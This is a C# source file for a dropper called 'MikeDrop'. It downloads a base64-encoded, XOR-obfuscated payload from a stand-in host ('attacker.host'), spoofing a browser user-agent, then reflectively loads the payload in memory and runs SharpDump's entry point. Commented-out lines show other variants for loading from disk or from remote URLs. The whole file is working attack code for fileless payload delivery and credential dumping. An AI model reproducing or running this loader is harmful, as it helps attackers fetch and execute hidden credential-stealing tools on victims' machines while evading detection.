using System;

// MikeDrop Program.cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Net;
using System.IO;

using System.Diagnostics;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace MikeDrop
{
    class Program
    {
        private static string XorWithKey(string text, string key)
        {
            var decrypted = new StringBuilder();

            for (int i = 0; i < (text.Length - 1); i++)
            {
                decrypted.Append((char)((uint)text[i] ^ (uint)key[i % key.Length]));
            }

            return decrypted.ToString();
        }
        static void Main(string[] args)
        {
            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");

            // Reflectively load assembly from a file on disk
            //var a = Assembly.LoadFile(@"C:\\Users\mikeg\Source\Repos\SharpEnumLibrary\SharpEnumLibrary\bin\Debug\SharpEnumLibrary.dll");

            // Reflectively load assembly from a remote URL
            //var a = Assembly.Load(wc.DownloadData("https://attacker.host/SharpEnumLibrary.dll"));

            // Reflectively load assembly from base64 encoded file via a remote URL
            //var a = Assembly.Load(System.Convert.FromBase64String(wc.DownloadString("https://attacker.host/SharpEnumLibrary.dll.b64")));

            // Reflectively load assembly from base64 encoded xor encrypted file via a remote URL
            var a = Assembly.Load(System.Convert.FromBase64String(
        XorWithKey(wc.DownloadString("https://attacker.host/SharpDump.exe.b64.xor"), "mykey")
    ));
            var t = a.GetType("SharpDump.Program");
            var c = Activator.CreateInstance(t);
            var m = t.GetMethod("RunMain");
            m.Invoke(c, null);

            // Pause for input
           
        }
    }
}
